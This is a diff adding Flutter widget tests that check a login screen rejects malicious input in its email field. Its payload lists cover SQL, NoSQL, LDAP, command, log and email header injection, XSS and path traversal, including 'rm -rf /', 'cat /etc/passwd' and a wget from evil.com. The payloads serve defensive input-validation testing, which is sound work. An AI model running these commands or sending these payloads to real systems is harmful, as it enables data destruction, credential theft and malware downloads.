@@ -200,5 +200,319 @@ void main() {
       );
       expect(loadingButtonAfter.isLoading, isFalse);
     });
+
+    group('Testes de Segurança', () {
+      testWidgets('deve rejeitar tentativas de SQL injection no campo email', (
+        WidgetTester tester,
+      ) async {
+        await tester.pumpWidget(createLoginScreen());
+
+        // Testa diferentes padrões de SQL injection
+        final sqlInjectionPatterns = [
+          "' OR '1'='1",
+          "'; DROP TABLE users; --",
+          "' UNION SELECT * FROM users --",
+          "admin'--",
+          "'; INSERT INTO users VALUES ('hacker', 'password'); --",
+        ];
+
+        for (final pattern in sqlInjectionPatterns) {
+          await tester.enterText(
+            find.byType(TextFormField).first,
+            pattern,
+          );
+          await tester.enterText(
+            find.byType(TextFormField).last,
+            'senha123',
+          );
+
+          await tester.tap(find.text('Entrar'));
+          await tester.pump();
+
+          // Deve mostrar erro de email inválido, não aceitar o SQL injection
+          expect(
+            find.text('Por favor, insira um e-mail válido'),
+            findsOneWidget,
+          );
+
+          // Limpa os campos para o próximo teste
+          await tester.enterText(find.byType(TextFormField).first, '');
+          await tester.enterText(find.byType(TextFormField).last, '');
+        }
+      });
+
+      testWidgets('deve rejeitar tentativas de XSS no campo email', (
+        WidgetTester tester,
+      ) async {
+        await tester.pumpWidget(createLoginScreen());
+
+        // Testa diferentes padrões de XSS
+        final xssPatterns = [
+          '<script>alert("xss")</script>',
+          'javascript:alert("xss")',
+          '<img src="x" onerror="alert(\'xss\')">',
+          '"><script>alert("xss")</script>',
+          '&#60;script&#62;alert("xss")&#60;/script&#62;',
+        ];
+
+        for (final pattern in xssPatterns) {
+          await tester.enterText(
+            find.byType(TextFormField).first,
+            pattern,
+          );
+          await tester.enterText(
+            find.byType(TextFormField).last,
+            'senha123',
+          );
+
+          await tester.tap(find.text('Entrar'));
+          await tester.pump();
+
+          // Deve mostrar erro de email inválido, não executar o XSS
+          expect(
+            find.text('Por favor, insira um e-mail válido'),
+            findsOneWidget,
+          );
+
+          // Limpa os campos para o próximo teste
+          await tester.enterText(find.byType(TextFormField).first, '');
+          await tester.enterText(find.byType(TextFormField).last, '');
+        }
+      });
+
+      testWidgets('deve rejeitar tentativas de NoSQL injection no campo email', (
+        WidgetTester tester,
+      ) async {
+        await tester.pumpWidget(createLoginScreen());
+
+        // Testa diferentes padrões de NoSQL injection
+        final nosqlInjectionPatterns = [
+          '{"\$ne": null}',
+          '{"\$gt": ""}',
+          '{"\$where": "1==1"}',
+          'admin@test.com" || "1"=="1',
+          '{"\$regex": ".*"}',
+        ];
+
+        for (final pattern in nosqlInjectionPatterns) {
+          await tester.enterText(
+            find.byType(TextFormField).first,
+            pattern,
+          );
+          await tester.enterText(
+            find.byType(TextFormField).last,
+            'senha123',
+          );
+
+          await tester.tap(find.text('Entrar'));
+          await tester.pump();
+
+          // Deve mostrar erro de email inválido, não aceitar a NoSQL injection
+          expect(
+            find.text('Por favor, insira um e-mail válido'),
+            findsOneWidget,
+          );
+
+          // Limpa os campos para o próximo teste
+          await tester.enterText(find.byType(TextFormField).first, '');
+          await tester.enterText(find.byType(TextFormField).last, '');
+        }
+      });
+
+      testWidgets('deve rejeitar tentativas de command injection no campo email', (
+        WidgetTester tester,
+      ) async {
+        await tester.pumpWidget(createLoginScreen());
+
+        // Testa diferentes padrões de command injection
+        final commandInjectionPatterns = [
+          'test@test.com; rm -rf /',
+          'test@test.com && cat /etc/passwd',
+          'test@test.com | ls -la',
+          'test@test.com; echo "malicious" > /tmp/hack',
+          'test@test.com && wget http://evil.com/malware',
+        ];
+
+        for (final pattern in commandInjectionPatterns) {
+          await tester.enterText(
+            find.byType(TextFormField).first,
+            pattern,
+          );
+          await tester.enterText(
+            find.byType(TextFormField).last,
+            'senha123',
+          );
+
+          await tester.tap(find.text('Entrar'));
+          await tester.pump();
+
+          // Deve mostrar erro de email inválido, não executar comandos
+          expect(
+            find.text('Por favor, insira um e-mail válido'),
+            findsOneWidget,
+          );
+
+          // Limpa os campos para o próximo teste
+          await tester.enterText(find.byType(TextFormField).first, '');
+          await tester.enterText(find.byType(TextFormField).last, '');
+        }
+      });
+
+      testWidgets('deve rejeitar tentativas de LDAP injection no campo email', (
+        WidgetTester tester,
+      ) async {
+        await tester.pumpWidget(createLoginScreen());
+
+        // Testa diferentes padrões de LDAP injection
+        final ldapInjectionPatterns = [
+          'test@test.com)(uid=*))(|(uid=*',
+          'test@test.com*)(uid=*))(|(uid=*',
+          'test@test.com)(|(password=*))',
+          'test@test.com*)(|(objectclass=*))',
+          'test@test.com)(cn=*))(|(cn=*',
+        ];
+
+        for (final pattern in ldapInjectionPatterns) {
+          await tester.enterText(
+            find.byType(TextFormField).first,
+            pattern,
+          );
+          await tester.enterText(
+            find.byType(TextFormField).last,
+            'senha123',
+          );
+
+          await tester.tap(find.text('Entrar'));
+          await tester.pump();
+
+          // Deve mostrar erro de email inválido, não aceitar a LDAP injection
+          expect(
+            find.text('Por favor, insira um e-mail válido'),
+            findsOneWidget,
+          );
+
+          // Limpa os campos para o próximo teste
+          await tester.enterText(find.byType(TextFormField).first, '');
+          await tester.enterText(find.byType(TextFormField).last, '');
+        }
+      });
+
+      testWidgets('deve rejeitar tentativas de path traversal no campo email', (
+        WidgetTester tester,
+      ) async {
+        await tester.pumpWidget(createLoginScreen());
+
+        // Testa diferentes padrões de path traversal
+        final pathTraversalPatterns = [
+          '../../../etc/passwd',
+          '..\\..\\..\\windows\\system32\\config\\sam',
+          '....//....//....//etc/passwd',
+          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+          '..%252f..%252f..%252fetc%252fpasswd',
+        ];
+
+        for (final pattern in pathTraversalPatterns) {
+          await tester.enterText(
+            find.byType(TextFormField).first,
+            pattern + '@test.com',
+          );
+          await tester.enterText(
+            find.byType(TextFormField).last,
+            'senha123',
+          );
+
+          await tester.tap(find.text('Entrar'));
+          await tester.pump();
+
+          // Deve mostrar erro de email inválido, não permitir path traversal
+          expect(
+            find.text('Por favor, insira um e-mail válido'),
+            findsOneWidget,
+          );
+
+          // Limpa os campos para o próximo teste
+          await tester.enterText(find.byType(TextFormField).first, '');
+          await tester.enterText(find.byType(TextFormField).last, '');
+        }
+      });
+
+      testWidgets('deve rejeitar tentativas de log injection no campo email', (
+        WidgetTester tester,
+      ) async {
+        await tester.pumpWidget(createLoginScreen());
+
+        // Testa diferentes padrões de log injection
+        final logInjectionPatterns = [
+          'test@test.com\n[ERROR] Fake error message',
+          'test@test.com\r\n[WARN] Fake warning',
+          'test@test.com\n[INFO] Fake info message',
+          'test@test.com\r[DEBUG] Fake debug message',
+          'test@test.com\n[CRITICAL] Fake critical error',
+        ];
+
+        for (final pattern in logInjectionPatterns) {
+          await tester.enterText(
+            find.byType(TextFormField).first,
+            pattern,
+          );
+          await tester.enterText(
+            find.byType(TextFormField).last,
+            'senha123',
+          );
+
+          await tester.tap(find.text('Entrar'));
+          await tester.pump();
+
+          // Deve mostrar erro de email inválido, não permitir log injection
+          expect(
+            find.text('Por favor, insira um e-mail válido'),
+            findsOneWidget,
+          );
+
+          // Limpa os campos para o próximo teste
+          await tester.enterText(find.byType(TextFormField).first, '');
+          await tester.enterText(find.byType(TextFormField).last, '');
+        }
+      });
+
+      testWidgets('deve rejeitar tentativas de email header injection', (
+        WidgetTester tester,
+      ) async {
+        await tester.pumpWidget(createLoginScreen());
+
+        // Testa diferentes padrões de email header injection
+        final headerInjectionPatterns = [
+          'test@test.com\nTo: evil@hacker.com',
+          'test@test.com\r\nSubject: Hacked',
+          'test@test.com\nCC: victim@company.com',
+          'test@test.com\r\nBCC: admin@company.com',
+          'test@test.com\nFrom: fake@company.com',
+        ];
+
+        for (final pattern in headerInjectionPatterns) {
+          await tester.enterText(
+            find.byType(TextFormField).first,
+            pattern,
+          );
+          await tester.enterText(
+            find.byType(TextFormField).last,
+            'senha123',
+          );
+
+          await tester.tap(find.text('Entrar'));
+          await tester.pump();
+
+          // Deve mostrar erro de email inválido, não permitir header injection
+          expect(
+            find.text('Por favor, insira um e-mail válido'),
+            findsOneWidget,
+          );
+
+          // Limpa os campos para o próximo teste
+          await tester.enterText(find.byType(TextFormField).first, '');
+          await tester.enterText(find.byType(TextFormField).last, '');
+        }
+      });
+    });
   });
 }
